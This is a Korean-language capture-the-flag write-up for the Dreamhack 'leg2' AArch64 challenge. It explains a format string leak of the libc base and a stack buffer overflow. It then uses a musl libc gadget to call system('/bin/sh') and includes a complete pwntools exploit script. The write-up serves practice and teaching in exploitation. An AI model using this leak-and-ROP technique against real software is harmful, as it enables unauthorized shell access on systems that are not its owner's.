dreamhack leg2
================


## 취약점 1 - FSB


ghidra로 main함수 까보면


```
undefined8 main(void)

{
  proc_init();
  vuln();
  return 0;
}
```

vuln 으로 가보면

<img width="407" height="350" alt="image" src="https://github.com/user-attachments/assets/8b65dfaa-935c-44f0-b0cc-dc534f5238d4" />

* printf(name_pointer) 부분에서 사용자의 입력(name_pointer)이
  포맷 스트링 인자 없이 그대로 출력 함수에 들어간다. 스택 내부의 값을 릭할 수 있다. = **Format String Bug**

<img width="538" height="112" alt="image" src="https://github.com/user-attachments/assets/118a4110-cc5d-45e4-8a85-0e742111a006" />

일단 이렇게 libc_base 주소 구할 수 있다. 


## 취약점 2 - BOF

<img width="879" height="227" alt="image" src="https://github.com/user-attachments/assets/c3d2ac40-cbb5-4a54-bdbe-61b442956974" />

gdb에서 vuln 디스어셈블해보면 이렇게 나온다.     

이때 read_input 호출 시 스택 버퍼의 크기보다 훨씬 큰 값을 입력받는다. mov w1, #0x200 (512 바이트)을 입력받지만 할당된 버퍼는 0x100 (256 바이트) 이므로 오버플로우가 발생한다.



## libc 릭하기


<img width="879" height="390" alt="image" src="https://github.com/user-attachments/assets/b636a374-de8c-4e36-bfae-3212ff5b87c0" />

<img width="1287" height="431" alt="image" src="https://github.com/user-attachments/assets/2064ee9b-d0a3-47a0-85e5-76976d2bc94e" />

일단 pdf에 나온대로 해봤는데 보이다시피 값이 좀 이상하다.    
pdf에서는 그냥 libc쓰고 있는데 내 환경에서는 musl libc을 쓰고 있어서 그렇다.    
chal 파일 자체가 안열려서 (/lib/ld-musl-aarch64.so.1 No such file or directory가 자꾸 발생해서) 해보다 보니까 그렇게 되었다.      

Musl Libc는 파일 크기가 작고 최적화가 많이 되어 있어 기존 풀이에서 사용한 가젯이 없을 확률이 크다고 한다. 

그래서 pdf의 방법으로 가젯과 오프셋을 얻어서 풀기는 어렵다.    

**따라서 Musl Libc 내부에 실제로 존재하면서 PAC 영향을 받지 않는 새로운 가젯을 찾아야 한다**



## NEW 가젯 구하기 


<img width="1287" height="212" alt="image" src="https://github.com/user-attachments/assets/af2c4880-2e7d-4e7d-b6ab-8989677daaf9" />

system("/bin/sh")를 실행하기 위해 인자 설정(x0)과 함수 호출(blr)을 한 번에 처리하는 가젯을 찾아낸다.   
ropper를 이용해 **ldp x0, x1, [sp, #0x18]; blr x1;** 라는 가젯을 찾아낼 수 있었다. 


  * **기능 1:** 스택(`sp + 24byte`)에서 데이터를 꺼내 `x0`(=인자)와 `x1`(=함수주소)에 넣습니다.
  * **기능 2:** `blr x1`으로 `x1`에 담긴 주소(`system`)를 즉시 호출합니다. (PAC 우회 효과)

### 3\. 실행 흐름 (Step-by-Step)

1.  **Buffer Overflow:**
      * 입력 버퍼를 넘치게 채워 `vuln` 함수의 \*\*리턴 주소(RET)\*\*까지 도달합니다. (Padding 264 bytes)
2.  **RET Overwrite:**
      * 리턴 주소를 우리가 찾은 \*\*Musl 가젯 주소(`0x755d0`)\*\*로 덮어씌웁니다.
3.  **Gadget 실행:**
      * `vuln` 함수가 종료되면서 가젯으로 점프합니다.
      * 가젯은 스택 포인터(`sp`)에서 **24바이트(0x18)** 뒤에 있는 값을 참조합니다. (이 공간을 더미 값 `B`로 채움)
4.  **데이터 로드 (`ldp`):**
      * **`x0` 레지스터** $\leftarrow$ **`/bin/sh` 주소** (우리가 스택에 넣어둔 값)
      * **`x1` 레지스터** $\leftarrow$ **`system` 함수 주소** (우리가 스택에 넣어둔 값)
5.  **함수 호출 (`blr`):**
      * `x1`에 있는 `system` 함수로 점프합니다.
      * 이때 `x0`에 `/bin/sh`가 들어 있으므로, 결과적으로 \*\*`system("/bin/sh")`\*\*가 실행되어 셸을 획득합니다.



from pwn import *

# 1. 설정
context.arch = 'aarch64'
context.os = 'linux'
context.log_level = 'debug'

e = ELF('./chal')
libc = ELF('/usr/lib/aarch64-linux-musl/libc.so') 



# p = remote('host8.dreamhack.games', 12280)
p = process('./chal') 

# ---------------------------------------------------------
# 2. Libc Leak
# ---------------------------------------------------------
p.recvuntil(b'your name > ')
p.sendline(b'%p') 

p.recvuntil(b'Hi! ')
leak_str = p.recvline().split()[0]
leak = int(leak_str, 16)
log.info(f"Leaked Address: {hex(leak)}")

# Libc Base 계산 (이전 분석값 0xd1ff0)
offset = 0xd1ff0
libc_base = leak - offset
libc.address = libc_base
log.success(f"Libc Base: {hex(libc_base)}")

# ---------------------------------------------------------
# 3. Payload 구성 (찾은 가젯 적용)
# ---------------------------------------------------------
# Gadget: ldp x0, x1, [sp, #0x18]; blr x1;
gadget_offset = 0x755d0 
gadget = libc_base + gadget_offset

system_addr = libc.symbols['system']
# strings 명령어로 찾은 0x89f00 오프셋 사용
binsh_addr = libc_base + 0x89f00 

log.info(f"Gadget: {hex(gadget)}")
log.info(f"/bin/sh: {hex(binsh_addr)}")
log.info(f"System: {hex(system_addr)}")

# 페이로드 작성
payload = b'A' * 264            # 1. Buffer Overflow Padding

payload += p64(gadget)          # 2. Return Address -> Gadget으로 점프

# [Gadget 동작] ldp x0, x1, [sp, #0x18]
# sp(현재 위치)에서 0x18(24 bytes) 뒤에 있는 값을 가져옴
# 따라서 24바이트의 쓰레기 값(Dummy)이 필요함
payload += b'B' * 24            # 3. Padding for offset 0x18

# [Data Loading]
payload += p64(binsh_addr)      # 4. x0 레지스터 (/bin/sh 주소)
payload += p64(system_addr)     # 5. x1 레지스터 (system 함수 주소 -> blr x1)

# ---------------------------------------------------------
# 4. 전송 및 쉘 획득
# ---------------------------------------------------------
p.recvuntil(b'Let me know your message!')
p.sendline(payload)

p.interactive()





<img width="1163" height="663" alt="image" src="https://github.com/user-attachments/assets/7b025056-e58b-4967-b0e0-4e66a6c46fef" />


